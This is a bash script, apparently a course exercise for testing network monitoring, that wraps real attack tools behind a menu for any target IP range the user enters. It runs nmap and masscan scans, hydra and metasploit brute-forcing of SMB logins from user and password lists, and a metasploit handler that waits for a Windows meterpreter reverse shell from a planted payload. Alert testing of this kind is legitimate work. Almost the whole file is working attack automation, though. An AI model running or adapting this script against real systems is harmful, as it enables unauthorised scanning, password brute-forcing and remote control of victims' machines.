#!/bin/bash

##Objective
#Create a script that runs different cyber attacks in a given network to check if monitoring alerts appear.

function menu ()
{
	#Initial selection menu.
#echo -e  \n for new line.

echo -e "\nPlease select the appropriate action by entering the corresponding number followed by ENTER."
echo -e "\n\e[0;32m1) To setup and initialise the system.\e[m \e[31m\n2) To conduct system scans or attacks.\e[m \n3) View/Access the log files. \n \n\e[1;35m0) Quit.\n\e[m"
read CHOICE1
echo -e "\nYou chose option $CHOICE1.\n"
case $CHOICE1 in

	1)
		echo "Starting system setup and initialisation. Please enter your password where prompted."
		
		inst
		
	;;

	2)
		echo -e "\e[1;31mWelcome to the network scan / attack menu.\n\e[m"
		
		chkme
		
	;;

	3)	echo "View or access the log files."
		
		LOGIT
	;;

	0)	echo "Quit" 
			exit
	;;
	
	*)  echo "Invalid option!"
			menu
		;;
	
	esac
}

#1. Install relevant application on local computer.

function inst()
{
sudo apt-get update && sudo apt-get install -y nmap masscan metasploit-framework 2>/dev/null

echo -e "\n "
#Run menu fucntion again to loop back. 
menu
}

#~ #2. Execute network scans and attacks. Allow the user to choose two methods of scanning and two different network attacks to run via your script.
#~ # Available tools: nmap, masscan, msfconsole

function  chkme()
#allow the user to choose different scans and attacks
{
echo -e "Before conducting scans or attacks please provide the requested inputs.\n"
	
read -rep $'Please provide a target IP(s) or hostname(s). \n\e[3m(e.g Can be a specific ip or range, for example 10.0.0.1 or 10.0.0.1/24)\e[0m:' tgtIP
		
read -rep $'Please provide the target port(s). \n\e[3m(e.g ENTER for null, can be a specific port, ports or port range, 80 or 22,53,80,443 or 100-8080)\e[0m:' tgtport

echo -e "\nYou have entered $tgtIP as the target ip or ip range.\n"
		
echo -e "\nYou have entered $tgtport as the target port or port range for masscan.\n"

echo -e "\nPlease select the process you would like to start."

echo -e "\n\e[33m1) Conduct an nmap scan. \n2) Conduct a masscan.\e[0m \n\e[31m3) Conduct a hydra attack. \n4) Conduct a metasploit SMB attack. \e[3m\e[1m(Port 445 must be open)\e[0m \e[31m\n5) Conduct a metaploit reverse tcp attack. \e[3m\e[1m(Requires badrevtcp.exe to be executed on the target system) \e[0m \n \n\e[1;35m0)Quit.\n\e[m"

read CHOICE2
echo -e "\nYou chose option $CHOICE2.\n"

case $CHOICE2 in

	1)
	#check to see if there is a target port
	
	if [[ -n "$tgtport" ]]
	then
	
	echo -e "Conducting an nmap scan with port specified.......\n "
	#With port inputs
			nmap -Pn -sV -p "$tgtport" "$tgtIP" -oN nmapscan_output
	else
	
	echo -e "Conducting an nmap scan with no port specified.......\n "
	#Run nmap scan ans save the output to a file
			nmap -Pn -sV "$tgtIP" -oN nmapscan_output
	fi
		
		echo -e "\n Scan outputs have been saved to the current working directory as nmapscan_output.\n"
		
		menu
		;;

	2) 
		echo -e "\nYou have selected to conduct a masscan. Please provide the requested inputs.\n"
	
	#check to see if there is a target port
	
	if [[ -n "$tgtport" ]]
	then
	echo -e "\nConducting a masscan........\n"
		#With port inputs
			sudo masscan "$tgtIP" -p "$tgtport" > masscan_output
	else
	read -p "For masscan, you must specify a target port or port range. [hint] try something like "-p80,8000-9000": " mstgtport
	
	echo -e "\nYou have specified $mstgtport as the target port or port range.\n"
	
	echo -e "\nConducting a masscan........\n"
	#Run nmap scan ans save the output to a file
			sudo masscan "$tgtIP" -p "$mstgtport" > masscan_output
	fi

		echo -e "\nScan outputs have been saved to the current working directory as masscan_output.\n"
		
		menu
		;;

	3)	echo -e "\nConduct a hydra attack on the target.\n"
					
		#Get list of ports from nmapscan_output
		#cat nmapscan_output | grep tcp | awk -F "/" '{print($1)}' | grep -x -E '[[:digit:]]+'
		hydra -L victimuser.lst -P victimpassword.lst $tgtIP smb -vV -o hydra_output
		
		echo -e "\nScan outputs have been saved to the current working directory as hydra_output.\n"
		
		menu
		;;
	
	4)	echo -e "\nConducting a metasploit SMB enumeration attack"
	
	#Send the required options for msfconsole to the .rc file.
			echo 'use auxiliary/scanner/smb/smb_login' > smb_enum.rc
			echo 'set rhosts' $tgtIP >> smb_enum.rc
			echo 'set user_file victimuser.lst' >> smb_enum.rc
			echo 'set pass_file victimpassword.lst' >> smb_enum.rc
			echo 'exploit' >> smb_enum.rc
			echo 'exit' >> smb_enum.rc
			
			msfconsole -r smb_enum.rc -o smbattack_result
			
			echo -e "\nScan outputs have been saved to the current working directory as smbattack_result.\n"
			
			menu	
		;;
		
	#Stretch goal reverse tcp attack.	

	5)	echo -e "\nConducting a metasploit reverse tcp attack. This will get you a meterpreter session."
	
		myIP=$(hostname -I | awk '{print $1}');
		 
		echo "Your local IP is $myIP."
	
		#Send the required options for msfconsole to the .rc file.
			echo 'use exploit/multi/handler' > revtcp_enum.rc
			echo 'set payload windows/meterpreter/reverse_tcp' >> revtcp_enum.rc
			echo 'set lhost' $myIP >> revtcp_enum.rc
			echo 'set lport 666' >> revtcp_enum.rc
			echo 'set SessionLogging true' >> revtcp_enum.rc
			echo 'spool ./msfconsole.log' >> revtcp_enum.rc
			echo 'exploit' >> revtcp_enum.rc
			
			msfconsole -r revtcp_enum.rc
			
			echo "This session has been logged in ./msfconsole.log."
			
			menu	
		;;

	0)	echo "Goodbye" 
				exit
		;;
	
	*)  echo "Invalid option!"
		menu
		
		;;
			
	esac
}

function LOGIT()
#use this function to save results such as date, time, IPs, kind of attack.
{
echo -e "\nThe outputs have all been saved to the current working directory.\n"
echo -e "\nPlease select the appropriate action by entering the corresponding number followed by ENTER."
echo -e "\n1) To view the Nmapscan output. \n2) To view the Masscan output. \n3) To view the Hydra attack result. \n4) To view the metasploit SMB attack result. \n5) To view the metasploit Reverse TCP attack result.\\n \n\e[1;35m0)Quit.\n\e[m"	
read CHOICE3
echo -e "\nYou chose option $CHOICE3.\n"
case $CHOICE3 in

	1)
		echo "Here are the Nmapscan results."
		
		cat nmapscan_output
		menu
		;;

	2)
		echo "Here are the Masscan results."
		
		cat masscan_output
		menu
		;;

	3)
		echo "Here are the Hydra attack results."
		
		cat hydra_output
		menu
		;;

	4)
		echo "Here are the metasploit SMB attack results."
		
		cat smbattack_result
		menu
		;;

	5)
		echo "Here are the metasploit Reverse TCP attack results."
		
		cat msfconsole.log
		menu
		;;		

	0)	echo "Quit" 
			exit
		;;
	
	*)  echo "Invalid option!"
		menu
		;;
	esac
}
#3. Log executed Attacks
#Every scan or attack should be logged and saved with the date and used arguments.

#Create all the necessary files in the system to avoid errors.
touch smb_enum.rc revtcp_enum.rc nmapscan_output massscan_output hydra_output
menu
